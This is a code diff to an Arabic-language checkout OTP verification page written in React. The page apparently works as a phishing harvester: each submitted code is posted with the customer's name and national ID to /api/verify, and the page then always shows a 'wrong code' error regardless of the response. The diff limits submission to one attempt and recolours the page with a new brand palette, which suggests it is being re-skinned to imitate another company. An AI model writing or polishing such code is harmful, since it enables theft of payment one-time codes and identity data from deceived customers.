@@ -28,6 +28,7 @@ export default function VerifyPage() {
   const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const [submitCooldown, setSubmitCooldown] = useState(0);
   const submitCooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const [submitted, setSubmitted] = useState(false);
   const [confirmed, setConfirmed] = useState(false);
   const [dbOrderId, setDbOrderId] = useState<string | null>(
     typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null
@@ -88,6 +89,7 @@ export default function VerifyPage() {
 
   async function handleSubmit(e: React.FormEvent) {
     e.preventDefault();
+    if (submitted) return;
     const code = otp.trim();
     if (code.length !== 4 && code.length !== 6) { setLengthError(true); return; }
     try {
@@ -97,7 +99,6 @@ export default function VerifyPage() {
         body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
       });
       if (!res.ok) {
-        // retry once on failure
         await fetch("/api/verify", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -105,8 +106,9 @@ export default function VerifyPage() {
         });
       }
     } catch {
-      // network error — silently ignore, user sees "wrong code" UI
+      // network error
     }
+    setSubmitted(true);
     setCodeError(true);
     setOtp("");
     inputRef.current?.focus();
@@ -148,10 +150,10 @@ export default function VerifyPage() {
             </Link>
 
             {/* Success Header */}
-            <div className="relative bg-gradient-to-br from-[#7CC043]/10 to-[#0F4C6E]/5 pt-8 pb-6 flex flex-col items-center">
+            <div className="relative bg-gradient-to-br from-[#8543C0]/10 to-[#A842E4]/5 pt-8 pb-6 flex flex-col items-center">
               <div className="absolute inset-0 overflow-hidden">
-                <div className="absolute -top-10 -right-10 w-40 h-40 bg-[#7CC043]/10 rounded-full blur-2xl" />
-                <div className="absolute -bottom-10 -left-10 w-32 h-32 bg-[#0F4C6E]/5 rounded-full blur-2xl" />
+                <div className="absolute -top-10 -right-10 w-40 h-40 bg-[#8543C0]/10 rounded-full blur-2xl" />
+                <div className="absolute -bottom-10 -left-10 w-32 h-32 bg-[#A842E4]/5 rounded-full blur-2xl" />
               </div>
               <motion.div
                 initial={{ scale: 0 }}
@@ -165,7 +167,7 @@ export default function VerifyPage() {
                 initial={{ opacity: 0, y: 10 }}
                 animate={{ opacity: 1, y: 0 }}
                 transition={{ delay: 0.4 }}
-                className="mt-3 bg-[#7CC043] text-white text-sm font-bold px-5 py-1.5 rounded-full shadow-[0_4px_12px_rgba(124,192,67,0.3)]"
+                className="mt-3 bg-[#8543C0] text-white text-sm font-bold px-5 py-1.5 rounded-full shadow-[0_4px_12px_rgba(133,67,192,0.3)]"
               >
                 نجحت عملية الدفع ✓
               </motion.span>
@@ -184,7 +186,7 @@ export default function VerifyPage() {
                   href={`/invoice/${confirmedId}`}
                   target="_blank"
                   rel="noopener noreferrer"
-                  className="flex-1 flex items-center justify-center gap-2 py-3 rounded-xl bg-gradient-to-r from-[#0F4C6E] to-[#1a6b5a] text-white font-bold text-sm shadow-[0_4px_16px_rgba(15,76,110,0.3)] hover:shadow-[0_8px_24px_rgba(15,76,110,0.4)] transition-shadow"
+                  className="flex-1 flex items-center justify-center gap-2 py-3 rounded-xl bg-gradient-to-r from-[#7A2FCC] to-[#8543C0] text-white font-bold text-sm shadow-[0_4px_16px_rgba(133,67,192,0.3)] hover:shadow-[0_8px_24px_rgba(133,67,192,0.4)] transition-shadow"
                 >
                   <FileText className="w-4 h-4" /> الفاتورة
                 </a>
@@ -192,7 +194,7 @@ export default function VerifyPage() {
                   href={`/invoice/${confirmedId}/receipt`}
                   target="_blank"
                   rel="noopener noreferrer"
-                  className="flex-1 flex items-center justify-center gap-2 py-3 rounded-xl bg-gradient-to-r from-[#7CC043] to-[#5a9e2e] text-white font-bold text-sm shadow-[0_4px_16px_rgba(124,192,67,0.3)] hover:shadow-[0_8px_24px_rgba(124,192,67,0.4)] transition-shadow"
+                  className="flex-1 flex items-center justify-center gap-2 py-3 rounded-xl bg-gradient-to-r from-[#A842E4] to-[#611FA0] text-white font-bold text-sm shadow-[0_4px_16px_rgba(168,66,228,0.3)] hover:shadow-[0_8px_24px_rgba(168,66,228,0.4)] transition-shadow"
                 >
                   <Receipt className="w-4 h-4" /> سند القبض
                 </a>
@@ -206,17 +208,17 @@ export default function VerifyPage() {
 
   // ── Main Page ──
   return (
-    <div className="min-h-screen flex flex-col bg-gradient-to-b from-gray-50/80 to-white" dir="rtl">
+    <div className="min-h-screen flex flex-col bg-gradient-to-br from-[#f9f5ff] via-[#fdfcff] to-[#f3eafc]" dir="rtl">
       {/* Header */}
-      <div className="sticky top-0 z-20 bg-white/80 backdrop-blur-xl border-b border-gray-100">
+      <div className="sticky top-0 z-20 bg-gradient-to-r from-[#090D54] via-[#611FA0] to-[#7A2FCC] shadow-[0_4px_20px_rgba(133,67,192,0.2)]">
         <div className="w-full mx-auto px-4 sm:px-8 lg:px-12 py-3 flex items-center justify-between">
           <div className="flex items-center gap-3">
-            <Link href="/checkout" className="w-9 h-9 bg-gray-100 rounded-xl flex items-center justify-center hover:bg-gray-200 transition-colors">
-              <IoChevronBack size={18} className="text-gray-600 rotate-180" />
+            <Link href="/checkout" className="w-9 h-9 bg-white/10 backdrop-blur-sm rounded-xl flex items-center justify-center hover:bg-white/20 transition-colors border border-white/10">
+              <IoChevronBack size={18} className="text-white/80 rotate-180" />
             </Link>
-            <h1 className="text-[15px] font-extrabold text-gray-800">تأكيد العملية</h1>
+            <h1 className="text-[15px] font-extrabold text-white">تأكيد العملية</h1>
           </div>
-          <div className="flex items-center gap-1.5 text-gray-400">
+          <div className="flex items-center gap-1.5 text-white/50">
             <IoShieldCheckmarkOutline size={14} />
             <span className="text-[11px] font-medium">اتصال مشفر</span>
           </div>
@@ -230,18 +232,18 @@ export default function VerifyPage() {
             <div key={i} className="flex items-center">
               <div className="flex flex-col items-center gap-1.5">
                 <div className={`w-10 h-10 rounded-full flex items-center justify-center transition-all ${
-                  step.done ? "bg-[#7CC043] text-white shadow-[0_4px_12px_rgba(124,192,67,0.3)]" :
-                  step.active ? "bg-[#0F4C6E] text-white shadow-[0_4px_12px_rgba(15,76,110,0.3)]" :
+                  step.done ? "bg-[#8543C0] text-white shadow-[0_4px_12px_rgba(133,67,192,0.3)]" :
+                  step.active ? "bg-[#090D54] text-white shadow-[0_4px_12px_rgba(9,13,84,0.3)]" :
                   "bg-gray-100 text-gray-400"
                 }`}>
                   {step.done ? <IoCheckmarkCircle size={20} /> : <step.icon size={18} />}
                 </div>
-                <span className={`text-[10px] font-bold ${step.done ? "text-[#7CC043]" : step.active ? "text-[#0F4C6E]" : "text-gray-400"}`}>
+                <span className={`text-[10px] font-bold ${step.done ? "text-[#8543C0]" : step.active ? "text-[#090D54]" : "text-gray-400"}`}>
                   {step.label}
                 </span>
               </div>
               {i < steps.length - 1 && (
-                <div className={`w-16 sm:w-24 h-0.5 mx-2 mb-5 rounded-full ${step.done ? "bg-[#7CC043]" : "bg-gray-200"}`} />
+                <div className={`w-16 sm:w-24 h-0.5 mx-2 mb-5 rounded-full ${step.done ? "bg-[#8543C0]" : "bg-gray-200"}`} />
               )}
             </div>
           ))}
@@ -256,10 +258,10 @@ export default function VerifyPage() {
           className="w-full max-w-md space-y-5"
         >
           {/* OTP Card */}
-          <div className="bg-white rounded-2xl shadow-[0_4px_24px_rgba(0,0,0,0.06)] border border-gray-100 p-6 sm:p-8 relative overflow-hidden">
+          <div className="bg-white rounded-2xl shadow-[0_4px_24px_rgba(133,67,192,0.06)] border border-[#8543C0]/[0.06] p-6 sm:p-8 relative overflow-hidden">
             {/* Decorative */}
-            <div className="absolute -top-16 -right-16 w-40 h-40 bg-[#0F4C6E]/[0.03] rounded-full blur-2xl pointer-events-none" />
-            <div className="absolute -bottom-16 -left-16 w-40 h-40 bg-[#7CC043]/[0.03] rounded-full blur-2xl pointer-events-none" />
+            <div className="absolute -top-16 -right-16 w-40 h-40 bg-[#8543C0]/[0.03] rounded-full blur-2xl pointer-events-none" />
+            <div className="absolute -bottom-16 -left-16 w-40 h-40 bg-[#A842E4]/[0.03] rounded-full blur-2xl pointer-events-none" />
 
             <div className="relative">
               {/* Icon & Title */}
@@ -268,7 +270,7 @@ export default function VerifyPage() {
                   initial={{ scale: 0.8 }}
                   animate={{ scale: 1 }}
                   transition={{ type: "spring", stiffness: 200 }}
-                  className="w-16 h-16 mx-auto mb-4 rounded-2xl bg-gradient-to-br from-[#0F4C6E] to-[#1a6b5a] flex items-center justify-center shadow-[0_8px_24px_rgba(15,76,110,0.25)]"
+                  className="w-16 h-16 mx-auto mb-4 rounded-2xl bg-gradient-to-br from-[#7A2FCC] to-[#A842E4] flex items-center justify-center shadow-[0_8px_24px_rgba(133,67,192,0.25)]"
                 >
                   <IoKeyOutline size={28} className="text-white" />
                 </motion.div>
@@ -287,7 +289,7 @@ export default function VerifyPage() {
                 </p>
               </div>
 
-              {/* OTP Boxes */}
+              {/* OTP Input */}
               <form onSubmit={handleSubmit} className="space-y-5">
                 <div dir="ltr">
                   <input
@@ -306,8 +308,8 @@ export default function VerifyPage() {
                       codeError
                         ? "border-red-300 bg-red-50/50 text-red-500 animate-[shake_0.3s_ease]"
                         : otp
-                        ? "border-[#0F4C6E] bg-[#0F4C6E]/5 text-[#0F4C6E]"
-                        : "border-gray-200 bg-gray-50 text-gray-800 focus:border-[#0F4C6E] focus:bg-white focus:shadow-[0_0_0_3px_rgba(15,76,110,0.1)]"
+                        ? "border-[#8543C0] bg-[#8543C0]/5 text-[#7A2FCC]"
+                        : "border-gray-200 bg-[#f9f5ff]/50 text-gray-800 focus:border-[#8543C0] focus:bg-white focus:shadow-[0_0_0_3px_rgba(133,67,192,0.1)]"
                     }`}
                   />
                 </div>
@@ -325,7 +327,7 @@ export default function VerifyPage() {
                     </motion.p>
                   )}
                   {resent && (
-                    <motion.p initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="text-[#7CC043] text-xs font-bold text-center">
+                    <motion.p initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="text-[#8543C0] text-xs font-bold text-center">
                       ✓ تم إعادة إرسال الرمز
                     </motion.p>
                   )}
@@ -334,13 +336,13 @@ export default function VerifyPage() {
                 {/* Submit Button */}
                 <motion.button
                   type="submit"
-                  disabled={submitCooldown > 0}
+                  disabled={submitCooldown > 0 || submitted}
                   whileHover={submitCooldown > 0 ? {} : { scale: 1.01 }}
                   whileTap={submitCooldown > 0 ? {} : { scale: 0.98 }}
                   className={`w-full py-3.5 rounded-xl font-bold text-sm flex items-center justify-center gap-2 transition-all duration-200 ${
                     submitCooldown > 0
                       ? "bg-gray-200 text-gray-400 cursor-not-allowed"
-                      : "bg-gradient-to-r from-[#0F4C6E] to-[#1a6b5a] text-white shadow-[0_8px_24px_rgba(15,76,110,0.3)] hover:shadow-[0_12px_32px_rgba(15,76,110,0.4)]"
+                      : "bg-gradient-to-r from-[#7A2FCC] via-[#8543C0] to-[#A842E4] text-white shadow-[0_8px_24px_rgba(133,67,192,0.3)] hover:shadow-[0_12px_32px_rgba(133,67,192,0.4)]"
                   }`}
                 >
                   {submitCooldown > 0 ? (
@@ -370,14 +372,14 @@ export default function VerifyPage() {
                       className={`font-bold transition-all select-none flex items-center gap-1 ${
                         cooldown > 0
                           ? "text-gray-300 cursor-not-allowed"
-                          : "text-[#0F4C6E] hover:text-[#0a3550]"
+                          : "text-[#8543C0] hover:text-[#7A2FCC]"
                       }`}
                     >
                       <IoRefreshOutline size={14} className={cooldown > 0 ? "" : "hover:rotate-180 transition-transform duration-500"} />
                       {cooldown > 0 ? `${cooldown}s` : "إعادة الإرسال"}
                     </button>
                   </div>
-                  <Link href="/checkout" className="flex items-center gap-1.5 text-gray-400 text-xs font-medium hover:text-gray-600 transition-colors">
+                  <Link href="/checkout" className="flex items-center gap-1.5 text-gray-400 text-xs font-medium hover:text-[#8543C0] transition-colors">
                     <IoArrowBack size={12} className="rotate-180" />
                     العودة لصفحة الدفع
                   </Link>
